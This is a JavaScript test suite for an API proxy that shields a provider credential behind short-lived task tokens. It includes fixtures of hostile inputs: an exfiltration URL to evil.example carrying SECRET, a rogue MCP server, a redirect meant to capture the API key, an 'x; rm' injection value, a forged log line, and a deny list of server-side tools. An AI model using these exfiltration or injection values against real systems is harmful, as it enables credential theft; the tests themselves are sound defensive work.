// The model proxy, against a fake upstream on localhost: no Docker, no internet, no real credential.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import http from 'node:http'
import net from 'node:net'
import { mkdtempSync, writeFileSync, chmodSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createTokens, createProxy, createAdmin, loadCredential, checkCredentialFile, ALLOWED_BETAS } from '../lib/proxy.js'

const listen = (handler) => new Promise((resolve) => {
  const server = http.createServer(handler)
  server.listen(0, '127.0.0.1', () => resolve({ server, url: `http://127.0.0.1:${server.address().port}` }))
})
const close = (s) => new Promise((r) => { s.closeAllConnections?.(); s.close(r) })

const REAL = 'sk-ant-api03-REAL-SECRET'
const MODEL = 'claude-haiku-4-5'

async function setup(opts = {}) {
  const seen = []
  const up = await listen((req, res) => {
    const chunks = []
    req.on('data', (c) => chunks.push(c))
    req.on('end', () => {
      seen.push({ method: req.method, url: req.url, headers: req.headers, body: Buffer.concat(chunks).toString() })
      if (opts.upstream) return opts.upstream(req, res)
      res.setHeader('content-type', 'application/json')
      res.end(JSON.stringify({ id: 'msg_1', usage: { input_tokens: 11, output_tokens: 7 } }))
    })
  })
  let now = 1_000_000
  const clock = () => now
  const tokens = createTokens({ clock, ttlMs: 60_000, maxRequests: 3 })
  const lines = []
  const credential = opts.credential ?? { kind: 'apikey', value: REAL }
  const proxy = await listen(createProxy({ tokens, credential, upstream: up.url, log: (l) => lines.push(l), clock, ...opts.proxy }))
  const call = (path, { token, method = 'POST', headers = {}, body = { model: MODEL, messages: [] } } = {}) =>
    fetch(proxy.url + path, {
      method,
      headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}), ...headers },
      body: method === 'POST' ? JSON.stringify(body) : undefined,
    })
  return { seen, tokens, lines, call, proxy, up, advance: (ms) => { now += ms }, done: async () => { await close(proxy.server); await close(up.server) } }
}

test('missing, unknown, expired, revoked and over-budget tokens are refused and nothing is forwarded', async () => {
  const t = await setup()
  try {
    assert.equal((await t.call('/v1/messages')).status, 401)
    assert.equal((await t.call('/v1/messages', { token: 'nope' })).status, 401)

    const expired = t.tokens.issue(1)
    t.advance(61_000)
    assert.equal((await t.call('/v1/messages', { token: expired })).status, 401)

    const revoked = t.tokens.issue(2)
    t.tokens.revoke(2)
    assert.equal((await t.call('/v1/messages', { token: revoked })).status, 401)

    const tok = t.tokens.issue(3)
    for (let i = 0; i < 3; i++) assert.equal((await t.call('/v1/messages', { token: tok })).status, 200)
    assert.equal((await t.call('/v1/messages', { token: tok })).status, 429)
    assert.equal(t.seen.length, 3)
  } finally { await t.done() }
})

test('the token is also accepted as x-api-key', async () => {
  const t = await setup()
  try {
    const tok = t.tokens.issue(4)
    const r = await t.call('/v1/messages', { headers: { 'x-api-key': tok } })
    assert.equal(r.status, 200)
  } finally { await t.done() }
})

test('the incoming auth never reaches upstream; the real API key does', async () => {
  const t = await setup()
  try {
    const tok = t.tokens.issue(5)
    await t.call('/v1/messages?beta=true', { token: tok, headers: { 'x-api-key': tok, cookie: 'a=b', 'anthropic-version': '2023-06-01' } })
    const h = t.seen[0].headers
    assert.equal(h['x-api-key'], REAL)
    assert.equal(h.authorization, undefined)
    assert.equal(h.cookie, undefined)
    assert.equal(h['anthropic-version'], '2023-06-01')
    assert.equal(t.seen[0].url, '/v1/messages?beta=true')
    assert.ok(!JSON.stringify(h).includes(tok))
  } finally { await t.done() }
})

test('an OAuth credential is sent as Bearer with the oauth beta, keeping the incoming betas', async () => {
  const t = await setup({ credential: { kind: 'oauth', value: 'sk-ant-oat01-REAL' } })
  try {
    const tok = t.tokens.issue(6)
    await t.call('/v1/messages', { token: tok, headers: { 'anthropic-beta': 'claude-code-20250219' } })
    const h = t.seen[0].headers
    assert.equal(h.authorization, 'Bearer sk-ant-oat01-REAL')
    assert.equal(h['x-api-key'], undefined)
    assert.deepEqual(h['anthropic-beta'].split(','), ['claude-code-20250219', 'oauth-2025-04-20'])
  } finally { await t.done() }
})

test('a model outside the allowlist is refused and not forwarded; the allowlist is configurable', async () => {
  const t = await setup()
  try {
    const tok = t.tokens.issue(7)
    assert.equal((await t.call('/v1/messages', { token: tok, body: { model: 'claude-opus-5-5' } })).status, 403)
    assert.equal((await t.call('/v1/messages', { token: tok, body: {} })).status, 403)
    assert.equal(t.seen.length, 0)
  } finally { await t.done() }
  const c = await setup({ proxy: { allowedModels: ['claude-sonnet-'] } })
  try {
    const tok = c.tokens.issue(8)
    assert.equal((await c.call('/v1/messages', { token: tok, body: { model: MODEL } })).status, 403)
    assert.equal((await c.call('/v1/messages', { token: tok, body: { model: 'claude-sonnet-5-5' } })).status, 200)
  } finally { await c.done() }
})

test('other paths give 404 and other methods 405; count_tokens is forwarded', async () => {
  const t = await setup()
  try {
    const tok = t.tokens.issue(9)
    assert.equal((await t.call('/v1/complete', { token: tok })).status, 404)
    assert.equal((await t.call('/v1/models', { token: tok, method: 'GET' })).status, 404)
    assert.equal((await t.call('/v1/messages', { token: tok, method: 'GET' })).status, 405)
    assert.equal(t.seen.length, 0)
    assert.equal((await t.call('/v1/messages/count_tokens', { token: tok })).status, 200)
    assert.equal(t.seen.length, 1)
  } finally { await t.done() }
})

test('SSE passes through incrementally', async () => {
  let release
  const gate = new Promise((r) => { release = r })
  const t = await setup({
    upstream: async (req, res) => {
      res.writeHead(200, { 'content-type': 'text/event-stream' })
      res.write('event: message_start\ndata: {"message":{"usage":{"input_tokens":5}}}\n\n')
      await gate
      res.end('event: message_delta\ndata: {"usage":{"output_tokens":9}}\n\n')
    },
  })
  try {
    const tok = t.tokens.issue(10)
    const r = await t.call('/v1/messages', { token: tok, body: { model: MODEL, stream: true } })
    assert.equal(r.headers.get('content-type'), 'text/event-stream')
    const reader = r.body.getReader()
    const first = new TextDecoder().decode((await reader.read()).value)
    assert.match(first, /message_start/) // arrived while upstream is still open
    release()
    let rest = ''
    for (;;) { const { done, value } = await reader.read(); if (done) break; rest += new TextDecoder().decode(value) }
    assert.match(rest, /message_delta/)
    await new Promise((r) => setTimeout(r, 20))
    assert.match(t.lines.at(-1), /in=5 out=9/)
  } finally { await t.done() }
})

test('logs: one line per request with task, model, status, tokens; never the credential or the token', async () => {
  const t = await setup()
  try {
    const tok = t.tokens.issue(11)
    await t.call('/v1/messages', { token: tok })
    await t.call('/v1/messages', { token: 'bad-token-xyz' })
    await new Promise((r) => setTimeout(r, 20))
    assert.equal(t.lines.length, 2)
    assert.match(t.lines[0], /task=11 model="claude-haiku-4-5" status=200 ms=\d+ in=11 out=7/)
    assert.match(t.lines[1], /status=401/)
    const all = t.lines.join('\n')
    for (const secret of [REAL, tok, 'bad-token-xyz']) assert.ok(!all.includes(secret))
  } finally { await t.done() }
})

test('the admin issues and revokes tokens; the proxy listener has no admin route', async () => {
  const t = await setup()
  const admin = await listen(createAdmin({ tokens: t.tokens }))
  try {
    const r = await fetch(admin.url + '/tokens', { method: 'POST', body: JSON.stringify({ tarea: 12, ttl_s: 30, max: 1 }) })
    assert.equal(r.status, 200)
    const { token } = await r.json()
    assert.equal((await t.call('/v1/messages', { token })).status, 200)
    assert.equal((await t.call('/v1/messages', { token })).status, 429)
    const t2 = (await (await fetch(admin.url + '/tokens', { method: 'POST', body: JSON.stringify({ tarea: 13 }) })).json()).token
    assert.equal((await fetch(admin.url + '/tokens/13', { method: 'DELETE' })).status, 200)
    assert.equal((await t.call('/v1/messages', { token: t2 })).status, 401)
    assert.equal((await t.call('/tokens', { token: t2 })).status, 404)
    assert.equal((await fetch(admin.url + '/tokens', { method: 'POST', body: '{"tarea":"x; rm"}' })).status, 400)
  } finally { await close(admin.server); await t.done() }
})

test('the credential file must be mode 600, outside any argv, and of a known kind', () => {
  const dir = mkdtempSync(join(tmpdir(), 'proxy-cred-'))
  try {
    const f = join(dir, 'cred')
    writeFileSync(f, 'sk-ant-api03-abc\n')
    chmodSync(f, 0o644)
    assert.throws(() => loadCredential(f), /600/)
    chmodSync(f, 0o600)
    assert.deepEqual(loadCredential(f), { kind: 'apikey', value: 'sk-ant-api03-abc' })
    writeFileSync(f, 'sk-ant-oat01-xyz')
    assert.deepEqual(loadCredential(f), { kind: 'oauth', value: 'sk-ant-oat01-xyz' })
    writeFileSync(f, 'garbage')
    assert.throws(() => loadCredential(f), /kind/)
    assert.throws(() => loadCredential(join(dir, 'missing')), /credential/i)
    try { loadCredential(f) } catch (e) { assert.ok(!e.message.includes('garbage')) }
  } finally { rmSync(dir, { recursive: true, force: true }) }
})

test('a request line the URL parser rejects gives 400 and the proxy keeps serving', async () => { // B1
  const t = await setup(); const errs = []; const h = (e) => errs.push(e); process.on('unhandledRejection', h)
  try {
    const port = new URL(t.proxy.url).port
    const answer = await new Promise((r) => { let d = ''; const c = net.connect(port, '127.0.0.1'); c.on('data', (b) => { d += b }); c.on('close', () => r(d)); c.on('error', () => r(d)); c.end('GET //[ HTTP/1.1\r\nHost: x\r\n\r\n') })
    assert.match(answer, /^HTTP\/1.1 400/)
    await new Promise((r) => setTimeout(r, 20)); assert.equal(errs.length, 0)
    assert.equal((await t.call('/v1/messages', { token: t.tokens.issue(20) })).status, 200)
  } finally { process.off('unhandledRejection', h); await t.done() }
})

test('a throwing handler answers 500 instead of killing the process', async () => {
  const t = await setup({ proxy: { fetch: () => { throw new TypeError('boom') } } })
  try {
    assert.equal((await t.call('/v1/messages', { token: t.tokens.issue(24) })).status, 502)
  } finally { await t.done() }
  const bad = { use() { throw new Error('boom') } }
  const s = await listen(createProxy({ tokens: bad, credential: { kind: 'apikey', value: REAL }, log: () => {} }))
  const a = await listen(createAdmin({ tokens: { issue() { throw new Error('boom') } } }))
  try {
    assert.equal((await fetch(s.url + '/v1/messages', { method: 'POST', body: '{}' })).status, 500)
    assert.equal((await fetch(a.url + '/tokens', { method: 'POST', body: '{"tarea":1}' })).status, 500)
  } finally { await close(s.server); await close(a.server) }
})

test('a task id is one canonical string: issue "7", revoke 7; unknown or odd ids are refused', async () => { // B2
  const t = await setup(); const admin = await listen(createAdmin({ tokens: t.tokens }))
  try {
    const { token } = await (await fetch(admin.url + '/tokens', { method: 'POST', body: '{"tarea":"7"}' })).json()
    assert.equal((await fetch(admin.url + '/tokens/7', { method: 'DELETE' })).status, 200)
    assert.equal((await t.call('/v1/messages', { token })).status, 401)
    assert.equal((await fetch(admin.url + '/tokens/7', { method: 'DELETE' })).status, 404) // nothing left to revoke
    const n = await (await fetch(admin.url + '/tokens', { method: 'POST', body: '{"tarea":8}' })).json()
    await fetch(admin.url + '/tokens/8', { method: 'DELETE' })
    assert.equal((await t.call('/v1/messages', { token: n.token })).status, 401)
    for (const bad of ['"007"', '"7 "', '-1', '1.5', '"a/b"', 'null']) {
      assert.equal((await fetch(admin.url + '/tokens', { method: 'POST', body: `{"tarea":${bad}}` })).status, 400, bad)
    }
    assert.equal((await fetch(admin.url + '/tokens/007', { method: 'DELETE' })).status, 400)
  } finally { await close(admin.server); await t.done() }
})

test('an upstream redirect is never followed with the credential', async () => { // A1
  const got = []; const evil = await listen((q, s) => { got.push(q.headers['x-api-key']); s.end('{}') })
  const t = await setup({ upstream: (q, s) => { s.writeHead(307, { location: evil.url }); s.end() } })
  try {
    const r = await t.call('/v1/messages', { token: t.tokens.issue(21) })
    assert.equal(r.status, 502)
    assert.deepEqual(got, [])
  } finally { await close(evil.server); await t.done() }
})

test('the forwarded body is the parsed one (no duplicate model key reaches upstream)', async () => { // A2
  const t = await setup()
  try {
    await fetch(t.proxy.url + '/v1/messages', { method: 'POST', headers: { authorization: 'Bearer ' + t.tokens.issue(22) }, body: '{"model":"claude-opus-4-1","model":"claude-haiku-4-5"}' })
    assert.ok(!(t.seen[0]?.body ?? '').includes('opus'))
  } finally { await t.done() }
})

test('server-side tools, mcp_servers and unknown betas are refused (403) and not forwarded; client tools pass', async () => { // A3
  const t = await setup()
  try {
    const tok = t.tokens.issue(25, { max: 50 })
    const body = (extra) => ({ model: MODEL, messages: [], ...extra })
    for (const extra of [
      { mcp_servers: [{ type: 'url', url: 'https://evil.example', name: 'x' }] },
      { tools: [{ type: 'web_fetch_20250910', name: 'web_fetch' }] },
      { tools: [{ type: 'code_execution_20250522', name: 'code_execution' }] },
      { tools: [{ name: 'ok', input_schema: {} }, { type: 'bash_20250124', name: 'bash' }] },
      { tools: 'nope' },
    ]) assert.equal((await t.call('/v1/messages', { token: tok, body: body(extra) })).status, 403, JSON.stringify(extra))
    assert.equal((await t.call('/v1/messages', { token: tok, body: body({}), headers: { 'anthropic-beta': 'claude-code-20250219,mcp-client-2025-04-04' } })).status, 403)
    assert.equal((await t.call('/v1/messages', { token: tok, body: body({}), headers: { 'anthropic-beta': 'web-search-2025-03-05' } })).status, 403)
    assert.equal(t.seen.length, 0)
    assert.equal((await t.call('/v1/messages', { token: tok, body: body({ tools: [{ name: 'Read', description: 'd', input_schema: { type: 'object' } }, { type: 'custom', name: 'c', input_schema: {} }] }), headers: { 'anthropic-beta': ALLOWED_BETAS.join(',') } })).status, 200)
  } finally { await t.done() }
})

test('a refused model cannot forge log lines', async () => { // A4
  const t = await setup()
  try {
    await t.call('/v1/messages', { token: t.tokens.issue(23), body: { model: 'x\ntask=99 status=200' } }); await new Promise((r) => setTimeout(r, 20))
    assert.ok(t.lines.length > 0 && t.lines.every((l) => !l.includes('\n')))
    assert.ok(t.lines.every((l) => !/^task=99/m.test(l)))
  } finally { await t.done() }
})

test('the host check of the credential file: missing, directory, group/other bits refused; 400 accepted', () => { // A5
  const dir = mkdtempSync(join(tmpdir(), 'proxy-cred-'))
  try {
    const f = join(dir, 'cred')
    assert.throws(() => checkCredentialFile(f), /not found/)
    assert.throws(() => checkCredentialFile(dir), /regular file/)
    writeFileSync(f, 'x'); chmodSync(f, 0o644)
    assert.throws(() => checkCredentialFile(f), /mode/)
    chmodSync(f, 0o640)
    assert.throws(() => checkCredentialFile(f), /mode/)
    chmodSync(f, 0o400)
    assert.doesNotThrow(() => checkCredentialFile(f))
    chmodSync(f, 0o600)
    assert.doesNotThrow(() => checkCredentialFile(f))
  } finally { rmSync(dir, { recursive: true, force: true }) }
})

test('only allowlisted upstream response headers reach the client', async () => { // A7
  const t = await setup({ upstream: (q, s) => { s.writeHead(200, { 'content-type': 'application/json', 'request-id': 'req_1', 'anthropic-organization-id': 'org-secret', 'set-cookie': 'a=b', 'anthropic-ratelimit-requests-remaining': '9' }); s.end('{}') } })
  try {
    const r = await t.call('/v1/messages', { token: t.tokens.issue(26) })
    assert.equal(r.headers.get('request-id'), 'req_1')
    assert.equal(r.headers.get('anthropic-ratelimit-requests-remaining'), '9')
    assert.equal(r.headers.get('anthropic-organization-id'), null)
    assert.equal(r.headers.get('set-cookie'), null)
  } finally { await t.done() }
})

test('expired tokens are purged and the body size is capped overall', async () => { // A8
  let now = 0
  const tokens = createTokens({ clock: () => now, ttlMs: 10 })
  const old = tokens.issue(1); now = 100; tokens.issue(2)
  assert.equal(tokens.size(), 1)
  assert.equal(tokens.use(old).ok, false)
  const t = await setup({ proxy: { maxBodyBytes: 100 } })
  try {
    const r = await t.call('/v1/messages', { token: t.tokens.issue(27), body: { model: MODEL, pad: 'x'.repeat(500) } })
    assert.equal(r.status, 413)
    assert.equal(t.seen.length, 0)
  } finally { await t.done() }
})

// What Claude Code 2.1.316 really sends on its first request (seen live by the verification): the betas and its tools,
// which carry no `type`, plus one defer_loading placeholder.
const CLAUDE_CODE_BETAS = 'interleaved-thinking-2025-05-14,context-management-2025-06-27,claude-code-20250219,thinking-token-count-2026-05-13,advanced-tool-use-2025-11-20'

test('the first request of Claude Code 2.1.316 is forwarded (its betas and its client tools)', async () => {
  const t = await setup()
  try {
    const body = { model: MODEL, messages: [], tools: [{ name: 'Read', input_schema: { type: 'object' } }, { name: 'X', input_schema: {}, defer_loading: true }] }
    const r = await t.call('/v1/messages', { token: t.tokens.issue(30), headers: { 'anthropic-beta': CLAUDE_CODE_BETAS }, body })
    assert.equal(r.status, 200)
    assert.equal(t.seen.length, 1)
  } finally { await t.done() }
})

test('a url source in an image or document block (anywhere in the body) is refused: Anthropic would fetch it for the agent', async () => {
  const leak = { type: 'url', url: 'https://evil.example/?d=SECRET' }
  const bodies = [
    { model: MODEL, messages: [{ role: 'user', content: [{ type: 'image', source: leak }] }] },
    { model: MODEL, messages: [{ role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', content: [{ type: 'document', source: leak }] }] }] },
  ]
  for (const route of ['/v1/messages', '/v1/messages/count_tokens']) {
    for (const body of bodies) {
      const t = await setup()
      try {
        assert.equal((await t.call(route, { token: t.tokens.issue(31), body })).status, 403, route)
        assert.equal(t.seen.length, 0)
      } finally { await t.done() }
    }
  }
  const t = await setup()
  try {
    const b64 = { model: MODEL, messages: [{ role: 'user', content: [{ type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'AAAA' } }] }] }
    assert.equal((await t.call('/v1/messages', { token: t.tokens.issue(32), body: b64 })).status, 200, 'base64 images (what Claude Code sends) pass')
  } finally { await t.done() }
})

test('the container accepts the same credential modes as the host check (400 and 600)', () => {
  const dir = mkdtempSync(join(tmpdir(), 'cred-'))
  try {
    const f = join(dir, 'c')
    writeFileSync(f, 'sk-ant-api03-abc')
    chmodSync(f, 0o400)
    checkCredentialFile(f)
    assert.deepEqual(loadCredential(f), { kind: 'apikey', value: 'sk-ant-api03-abc' })
    chmodSync(f, 0o640)
    assert.throws(() => loadCredential(f), /600/)
  } finally { rmSync(dir, { recursive: true, force: true }) }
})
